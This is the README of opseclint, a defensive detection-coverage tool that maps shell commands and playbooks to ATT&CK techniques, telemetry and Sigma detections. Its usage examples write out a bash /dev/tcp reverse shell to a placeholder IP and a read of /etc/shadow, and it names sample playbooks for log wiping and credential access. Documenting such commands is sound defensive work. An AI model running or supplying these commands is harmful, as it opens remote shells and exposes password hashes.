# opseclint

[![CI](https://github.com/Gerrrt/opseclint/actions/workflows/ci.yml/badge.svg)](https://github.com/Gerrrt/opseclint/actions/workflows/ci.yml)

**A detection-coverage analyzer for the command line.** Point it at a command,
a script, or a post-exploitation playbook and it statically resolves each action
to the [MITRE ATT&CK](https://attack.mitre.org/) technique(s) it implements, the
host telemetry it emits, and the detections that would fire — each with a
detectability score.

It answers one question: **"what would a defender see?"**

```
$ opseclint -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'

opseclint — detection-coverage report (linux-auditd)
1 line(s) analyzed, 1 finding(s)

  L1    [CRITICAL 82]  Bash /dev/tcp reverse shell — interactive C2 channel
        technique  T1059.004 Command and Scripting Interpreter: Unix Shell
        technique  T1071 Application Layer Protocol
        telemetry  bash execve() followed by connect() to attacker IP
        telemetry  stdin/stdout/stderr duped to a socket fd
        detection  Sigma: Reverse shell via /dev/tcp redirection (proc_creation_lnx) (high confidence)

summary  loudest action: CRITICAL (82)
```

## Who it's for

- **Detection engineers** validating coverage — "if an operator ran this, would
  my ruleset catch it, and with what telemetry?"
- **Purple teams** mapping an engagement's actions to expected detections before
  and after a test.
- **Red teams** operating under authorization who need to understand and report
  the telemetry footprint of a playbook.

### Scope

opseclint describes **detectability** — the defensive signal an action
generates. It is not an evasion tool: it does not recommend "quieter"
alternatives or ways to defeat a detection. Absence of a finding means only that
nothing in the knowledge base matched — it is never a claim that an action is
stealthy.

## Install

```bash
cargo install --path .
# or, from a checkout:
cargo build --release   # -> target/release/opseclint
```

## Usage

```bash
opseclint script.sh                 # analyze a file (Linux/auditd by default)
opseclint -c 'sudo cat /etc/shadow' # analyze a single command
cat playbook.sh | opseclint         # read from stdin
opseclint app.ps1 --platform windows-sysmon   # analyze against Windows/Sysmon

opseclint script.sh --min 50        # only show findings >= detectability 50
opseclint script.sh --json          # machine-readable output
opseclint script.sh --sarif         # SARIF 2.1.0 (GitHub code scanning)
opseclint script.sh --sigma ./sigma # enrich with a real SigmaHQ checkout
opseclint script.sh --ci --threshold 70   # exit 1 if loudest action >= 70
```

### Real Sigma rules

By default, detection references in the seed KB are *representative*. Point
`--sigma` at a checkout of [SigmaHQ/sigma](https://github.com/SigmaHQ/sigma)
(or any directory of Sigma YAML) and opseclint indexes every rule by its ATT&CK
technique tag, then replaces each finding's references with the **genuine rule
titles and UUIDs** that match — Linux-relevant rules only.

```bash
git clone --depth 1 https://github.com/SigmaHQ/sigma
opseclint examples/recon.sh --sigma sigma/rules
# detection  Sigma: Access To Sudoers File (2c9d1141-... ) (high confidence)
```

The ruleset is read at runtime and never bundled, so the binary stays
self-contained.

### Platforms

Select the host telemetry model with `--platform` (default `linux-auditd`):

| Platform          | Telemetry model                                   |
|-------------------|---------------------------------------------------|
| `linux-auditd`    | Linux with auditd / EDR syscall events            |
| `windows-sysmon`  | Windows with Sysmon (Event IDs) / Security log    |

Each platform has its own embedded knowledge base, so `whoami` resolves to Linux
`execve()` telemetry or a Windows Sysmon EID 1 depending on the target. Windows
program names are normalized (`C:\…\certutil.exe` → `certutil`). When combined
with `--sigma`, rules are filtered to the platform's `logsource.product`.

### GitHub code scanning

`--sarif` emits SARIF 2.1.0, so findings can surface in a repo's **Security →
Code scanning** tab. Each finding maps to a rule (tagged with its ATT&CK
technique and a `security-severity` derived from the detectability score) and is
anchored to the line of the analyzed file. See [`.github/workflows/ci.yml`](.github/workflows/ci.yml)
for a job that runs opseclint and uploads the results.

### CI gating

`--ci` makes opseclint a gate: it exits non-zero when the loudest modeled action
meets or exceeds `--threshold` (default 50), so a team can fail a pipeline on
tradecraft that exceeds an agreed noise budget.

```yaml
# .github/workflows/opsec.yml (example)
- run: opseclint playbooks/ --ci --threshold 75
```

### Example playbooks

The [`examples/`](examples/) directory has illustrative (benign-to-run)
playbooks to try it against:

```bash
opseclint examples/recon.sh           # post-compromise recon (Linux)
opseclint examples/persistence.sh     # accounts, cron, systemd, ld.so.preload, ...
opseclint examples/defense-evasion.sh # SELinux/firewall/auditd off, log & history wiping
opseclint examples/windows-postex.ps1 --platform windows-sysmon  # Windows LOLBins, cred access
```

## Detectability score

A 0–100 estimate of how strongly an action surfaces in defensive telemetry
(higher = louder), bucketed as:

| Score  | Severity  |
|--------|-----------|
| 0–24   | LOW       |
| 25–49  | MEDIUM    |
| 50–74  | HIGH      |
| 75–100 | CRITICAL  |

## How it works

1. **Parser** (`parser.rs`) — quote-aware tokenizer that strips comments and
   `VAR=value` assignments, splits a line on control operators (`; | & && ||`),
   unwraps `sudo`/`env`/`nohup`/… and resolves each segment to a program +
   arguments. The raw line is preserved so substring rules still match. A
   preprocessing pass joins line continuations (trailing `\`, `|`, `&&`, `||`),
   resolves commands hidden in `$(...)` / backtick substitutions, and handles
   here-docs — a here-doc body is skipped as data unless it feeds a shell
   interpreter, in which case each body line is analyzed at its real line.
2. **Knowledge base** (`data/knowledge.json`, `data/knowledge-windows.json`) —
   one KB per platform; each entry maps a command (or a raw pattern) to ATT&CK
   techniques, the telemetry it emits, representative Sigma-style detections,
   and a detectability score.
3. **Analyzer** (`analyzer.rs`) — matches every action against the KB,
   deduplicates per line, and ranks findings loudest-first.
4. **Report** (`report.rs`) — terminal or JSON output, plus the CI gate.

Both KBs are embedded at compile time, so opseclint ships as a single static
binary with no runtime dependencies.

### Knowledge base schema

```json
{
  "id": "shadow-read",
  "raw_contains": "/etc/shadow",
  "description": "Access to /etc/shadow — password hash exposure",
  "techniques": [{ "id": "T1003.008", "name": "OS Credential Dumping: /etc/passwd and /etc/shadow" }],
  "telemetry": ["openat() of /etc/shadow — high-signal auditd file watch"],
  "detections": [{ "source": "Sigma", "rule": "...", "confidence": "high" }],
  "noise": 85
}
```

An entry matches either by `command` (with optional `args_contains` /
`raw_contains` refinements) or by `raw_contains` alone. Adding coverage is a
data change, not a code change.

## Status & roadmap

`v0.1` seeds two platforms: **Linux / auditd** (~60 entries) and **Windows /
Sysmon** (~40 entries), covering the most common post-exploitation actions
across discovery, credential access, execution, persistence, defense evasion,
and (Linux) container escape. On the roadmap:

- Deepen both KBs, especially domain / Active Directory tradecraft on Windows.
- Cache the parsed Sigma index so large checkouts load faster.
- macOS / Endpoint Security as a third platform.

**Detection references in the seed KB are representative** of publicly available
Sigma logic and should be validated against your deployed ruleset before you
rely on them.

## License

MIT
